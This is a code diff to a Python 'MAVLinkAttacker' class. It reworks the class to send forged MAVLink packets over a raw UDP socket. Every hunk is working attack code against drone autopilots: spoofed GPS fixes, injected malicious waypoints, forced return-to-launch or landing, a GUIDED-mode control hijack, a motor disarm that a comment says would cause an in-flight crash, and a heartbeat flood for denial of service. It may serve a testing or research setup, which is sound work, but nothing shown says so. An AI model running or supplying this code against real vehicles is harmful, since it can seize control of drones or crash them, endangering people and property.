@@ -83,21 +83,20 @@ class MAVLinkAttacker:
         self.target_host = target_host
         self.target_port = target_port
         
-        # Create MAVLink connection
-        connection_string = f'udpout:{target_host}:{target_port}'
-        logger.info(f"🎯 Attacker connecting to: {connection_string}")
+        # Create raw UDP socket (reliable on Windows)
+        logger.info(f"🎯 Attacker creating UDP socket for: {target_host}:{target_port}")
         
         try:
-            self.mav = mavutil.mavlink_connection(
-                connection_string,
-                source_system=255,  # Use system ID 255 (attacker)
-                source_component=190,  # Arbitrary component ID
-                dialect='common'
-            )
-            logger.info(f"✅ Connection established")
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            logger.info(f"✅ UDP socket created")
         except Exception as e:
-            logger.error(f"❌ Failed to connect: {e}")
+            logger.error(f"❌ Failed to create socket: {e}")
             sys.exit(1)
+        
+        # Create MAVLink packer (NO network binding - pure encoder)
+        self.mav = mavlink2.MAVLink(None)
+        self.mav.srcSystem = 255  # Attacker system ID
+        self.mav.srcComponent = 190  # Attacker component ID
         
         # Attack statistics
         self.attacks_sent = {
@@ -111,14 +110,16 @@ class MAVLinkAttacker:
     def send_heartbeat(self):
         """Send MAVLink HEARTBEAT to prime downstream parsers"""
         try:
-            self.mav.mav.heartbeat_send(
+            msg = self.mav.heartbeat_encode(
                 mavutil.mavlink.MAV_TYPE_GCS,  # Type: Ground Control Station
                 mavutil.mavlink.MAV_AUTOPILOT_INVALID,  # No autopilot
                 0,  # Base mode
                 0,  # Custom mode
                 mavutil.mavlink.MAV_STATE_ACTIVE  # System status
             )
-            logger.info("📡 Heartbeat sent to prime MAVLink parser")
+            packet = msg.pack(self.mav)
+            self.sock.sendto(packet, (self.target_host, self.target_port))
+            logger.info(f"[ATTACKER] Sent HEARTBEAT to {self.target_host}:{self.target_port} ({len(packet)} bytes)")
             time.sleep(0.1)  # Brief delay for parser initialization
         except Exception as e:
             logger.warning(f"⚠️  Heartbeat send failed: {e}")
@@ -142,7 +143,7 @@ class MAVLinkAttacker:
         
         try:
             # Create fake GPS_RAW_INT message
-            self.mav.mav.gps_raw_int_send(
+            msg = self.mav.gps_raw_int_encode(
                 time_usec=int(time.time() * 1e6),  # Current time in microseconds
                 fix_type=3,  # 3D fix (looks legitimate)
                 lat=int(fake_lat * 1e7),  # Latitude in 1e7 degrees
@@ -154,9 +155,12 @@ class MAVLinkAttacker:
                 cog=18000,  # Course over ground (degrees * 100)
                 satellites_visible=12  # Number of satellites (looks legitimate)
             )
+            packet = msg.pack(self.mav)
+            self.sock.sendto(packet, (self.target_host, self.target_port))
             
             self.attacks_sent['gps_spoof'] += 1
             self.attacks_sent['total'] += 1
+            logger.info(f"[ATTACKER] Sent GPS_RAW_INT to {self.target_host}:{self.target_port} ({len(packet)} bytes)")
             logger.info(f"✅ Fake GPS message sent (Total: {self.attacks_sent['gps_spoof']})")
             
         except Exception as e:
@@ -182,7 +186,7 @@ class MAVLinkAttacker:
         
         try:
             # Create malicious MISSION_ITEM message
-            self.mav.mav.mission_item_send(
+            msg = self.mav.mission_item_encode(
                 target_system=1,  # Target autopilot system ID
                 target_component=1,  # Target autopilot component ID
                 seq=seq,  # Waypoint sequence number
@@ -198,9 +202,12 @@ class MAVLinkAttacker:
                 y=lon,  # Longitude
                 z=alt  # Altitude
             )
+            packet = msg.pack(self.mav)
+            self.sock.sendto(packet, (self.target_host, self.target_port))
             
             self.attacks_sent['waypoint_inject'] += 1
             self.attacks_sent['total'] += 1
+            logger.info(f"[ATTACKER] Sent MISSION_ITEM to {self.target_host}:{self.target_port} ({len(packet)} bytes)")
             logger.info(f"✅ Malicious waypoint sent (Total: {self.attacks_sent['waypoint_inject']})")
             
         except Exception as e:
@@ -226,7 +233,7 @@ class MAVLinkAttacker:
             if command_type == "RTL":
                 # Force Return to Launch
                 logger.info("Forcing RTL (Return to Launch)...")
-                self.mav.mav.command_long_send(
+                msg = self.mav.command_long_encode(
                     target_system=1,
                     target_component=1,
                     command=mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
@@ -234,11 +241,14 @@ class MAVLinkAttacker:
                     param1=0, param2=0, param3=0, param4=0,
                     param5=0, param6=0, param7=0
                 )
+                packet = msg.pack(self.mav)
+                self.sock.sendto(packet, (self.target_host, self.target_port))
+                logger.info(f"[ATTACKER] Sent COMMAND_LONG (RTL) to {self.target_host}:{self.target_port} ({len(packet)} bytes)")
                 
             elif command_type == "DISARM":
                 # DANGEROUS: Disarm motors (would cause crash if in flight!)
                 logger.warning("⚠️  ATTEMPTING TO DISARM MOTORS (WOULD CAUSE CRASH!)")
-                self.mav.mav.command_long_send(
+                msg = self.mav.command_long_encode(
                     target_system=1,
                     target_component=1,
                     command=mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
@@ -247,11 +257,14 @@ class MAVLinkAttacker:
                     param2=0, param3=0, param4=0,
                     param5=0, param6=0, param7=0
                 )
+                packet = msg.pack(self.mav)
+                self.sock.sendto(packet, (self.target_host, self.target_port))
+                logger.info(f"[ATTACKER] Sent COMMAND_LONG (DISARM) to {self.target_host}:{self.target_port} ({len(packet)} bytes)")
                 
             elif command_type == "LAND":
                 # Force landing
                 logger.info("Forcing emergency landing...")
-                self.mav.mav.command_long_send(
+                msg = self.mav.command_long_encode(
                     target_system=1,
                     target_component=1,
                     command=mavutil.mavlink.MAV_CMD_NAV_LAND,
@@ -259,15 +272,21 @@ class MAVLinkAttacker:
                     param1=0, param2=0, param3=0, param4=0,
                     param5=0, param6=0, param7=0
                 )
+                packet = msg.pack(self.mav)
+                self.sock.sendto(packet, (self.target_host, self.target_port))
+                logger.info(f"[ATTACKER] Sent COMMAND_LONG (LAND) to {self.target_host}:{self.target_port} ({len(packet)} bytes)")
             
             elif command_type == "MODE_GUIDED":
                 # Change to GUIDED mode (take over control)
                 logger.info("Switching to GUIDED mode (hijacking control)...")
-                self.mav.mav.set_mode_send(
+                msg = self.mav.set_mode_encode(
                     target_system=1,
                     base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                     custom_mode=4  # GUIDED mode for ArduCopter
                 )
+                packet = msg.pack(self.mav)
+                self.sock.sendto(packet, (self.target_host, self.target_port))
+                logger.info(f"[ATTACKER] Sent SET_MODE to {self.target_host}:{self.target_port} ({len(packet)} bytes)")
             
             self.attacks_sent['command_inject'] += 1
             self.attacks_sent['total'] += 1
@@ -302,13 +321,15 @@ class MAVLinkAttacker:
         try:
             while (time.time() - start_time) < duration_sec:
                 # Send rapid heartbeat messages
-                self.mav.mav.heartbeat_send(
+                msg = self.mav.heartbeat_encode(
                     type=mavutil.mavlink.MAV_TYPE_GCS,
                     autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                     base_mode=0,
                     custom_mode=0,
                     system_status=mavutil.mavlink.MAV_STATE_ACTIVE
                 )
+                packet = msg.pack(self.mav)
+                self.sock.sendto(packet, (self.target_host, self.target_port))
                 
                 msg_count += 1
                 
@@ -320,6 +341,7 @@ class MAVLinkAttacker:
                     elapsed = time.time() - start_time
                     actual_rate = msg_count / elapsed
                     logger.info(f"  Flooding... {msg_count} msgs sent ({actual_rate:.1f} msgs/sec)")
+                    logger.info(f"[ATTACKER] Sent HEARTBEAT #{msg_count} to {self.target_host}:{self.target_port}")
             
             self.attacks_sent['dos_flood'] += msg_count
             self.attacks_sent['total'] += msg_count
